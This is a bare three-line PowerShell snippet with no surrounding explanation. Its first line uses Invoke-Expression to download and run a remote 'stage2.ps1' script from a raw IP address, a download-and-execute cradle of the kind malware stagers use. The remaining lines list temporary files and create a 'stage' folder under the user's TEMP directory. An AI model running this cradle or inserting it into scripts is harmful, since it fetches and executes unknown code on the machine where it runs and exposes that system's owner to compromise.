Invoke-Expression (New-Object System.Net.WebClient).DownloadString("http://203.0.113.163/stage2.ps1")
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
